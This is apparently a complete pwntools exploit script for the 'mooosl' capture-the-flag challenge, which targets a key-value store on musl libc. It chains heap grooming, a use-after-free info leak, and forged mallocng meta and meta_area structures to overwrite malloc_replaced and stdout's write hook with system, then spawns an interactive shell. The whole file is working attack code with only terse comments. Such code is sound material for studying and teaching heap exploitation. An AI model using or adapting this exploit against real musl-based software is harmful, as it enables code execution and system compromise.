from pwn import *

context.arch = 'amd64'

#r = process(["./libc.so", "./mooosl"])
#r = process(["./mooosl"])
r = remote("mooosl.challenges.ooo", 23333)
#r = process(["./debug_libc.so", "./mooosl"])
libc = ELF("/usr/lib/x86_64-linux-musl/libc.so")

def store(key, value=b'A'*0x10, key_len=None, val_len=None):
    if key_len is None:
        key_len = len(key)
    if val_len is None:
        val_len = len(value)
    r.sendlineafter("option: ", "1")
    r.sendlineafter("key size: ", str(key_len))
    r.sendafter("key content: ", key)
    r.sendlineafter("value size: ", str(val_len))
    r.sendafter("value content: ", value)

def query(key):
    r.sendlineafter("option: ", "2")
    r.sendlineafter("key size: ", str(len(key)))
    r.sendafter("key content: ", key)

def delete(key):
    r.sendlineafter("option: ", "3")
    r.sendlineafter("key size: ", str(len(key)))
    r.sendafter("key content: ", key)

target_key = b'\xb8'
key1 = b'o99y4z'
key2 = b'o9ay24'
key3 = b'o9bv53'

# heap layout preparation to force a layout where key is allocated before store_t
#store(b"gap", value=b"B"*0x60)
store(b"first", value=b"B"*0x60)
store(b"X"*0x30, value=b"Y"*0x30)
store(b"Y"*0x30, value=b"X"*0x60)
delete(b"first")

# now, finally, allocate a, b
store(key1, value=b"A"*0x30) # allocate a
store(key2, value=key3.ljust(0x70, b'\x00')) # allocate b

# delete chunk A and trigger the vulnerability
delete(key1)

# force recycling
for _ in range(2):
    store(b"K"*0x30, value=b"A"*0x30)
store(b"K", value=b"A"*0x60)

# get info leak
query(key1)
r.recvuntil(":")
line = r.recv(16)
heap_ptr = u64(p64(int(line, 16), endianness="big"))
libc_base = heap_ptr - 0x7ffff7ffea90 + 0x00007ffff7f47000
log.info("heap_ptr: %#x" % heap_ptr)
log.info("libc_base: %#x" % libc_base)
assert libc_base & 0xfff == 0

# calculation
stdout_write = libc_base + 0x7ffff7ffb2c8-0x00007ffff7f47000
stdout = libc_base + 0x7ffff7ffb280-0x00007ffff7f47000
secret_addr = libc_base + 0x7ffff7ffbac0-0x00007ffff7f47000
malloc_replaced = libc_base + 0x7ffff7ffdf84-0x00007ffff7f47000
system = libc_base + libc.symbols['system']
#fake_meta_addr = libc_base + 0x7ffff7f30020-0x00007ffff7f47000+0x4000
fake_meta_addr = libc_base - 0x7000 + 0x1020
log.info("fake_meta_addr: %#x" % fake_meta_addr)

# leak context.secrete
delete(b"Y"*0x30)
store(key3.ljust(0x30, b'A'), p64(heap_ptr+0x310)+p64(secret_addr)+p64(6)+p64(0x30)+p64(0x00000000ddb7728d)+p64(0))
query(key3)
r.recvuntil(":")
line = r.recv(16)
secret = u64(p64(int(line, 16), endianness="big"))
log.info("secret: %#x" % secret)

# reset heap
delete(key3.ljust(0x30, b'A'))
delete(b"X"*0x30)
delete(b'A'*0x30)
delete(b'A'*0x30)

store(b"padding", value=b'A'*0x30)

######## parepare a fake chunk and a fake store
fake_chunk = flat([fake_meta_addr, 0, 0, 0x0001a0000000000c]).ljust(0x30, b'A')
store(b"fake_chunk", fake_chunk)

fake_store = flat([heap_ptr+0x4c0, heap_ptr+0x2e0, 6, 0x30, 0x00000000ddb7728d, 0])
store(b"fake_store", fake_store)

##### prepare fake meta_area and inject it into malloc_context
fake_area = flat([secret, 0, 1, 0])
fake_meta = flat([0, 0, heap_ptr+0x2d0, 0, 0x222])
store(b"fake_area", b"\x00"*0xfe0+fake_area+fake_meta+b'\n', val_len=0x2000)
delete(key3)

#### change mem pointer and rewrite malloc_replaced
delete(b"fake_area")
fake_meta = flat([fake_meta_addr, fake_meta_addr, malloc_replaced-13, 0x0000000100000000, 0x122])
store(b"fake_area", b"\x00"*0xfd0+fake_area+fake_meta+b'\n', val_len=0x2000)
store(b"A", b"\x00"*0x80)

##### change mem pointer and rewrite stdout_write
delete(b"fake_area")
fake_meta = flat([fake_meta_addr, fake_meta_addr, stdout-0x40, 0x0000000100000000, 0x122])
store(b"fake_area", b"\x00"*0xfc0+fake_area+fake_meta+b'\n', val_len=0x2000)
#store(b"A", b"\x00"*0x80)

r.sendlineafter("option: ", "1")
fake_stdout = b'E;sh;'.ljust(0x10, b'\x00')+p64(0)*7+p64(system)*2+p64(fake_meta_addr+0x80)+p64(0)*3+p64(1)+p64(0)
r.sendlineafter("key size: ", str(0x80))
r.send(fake_stdout+b'\n')

#gdb.attach(r)
r.interactive()

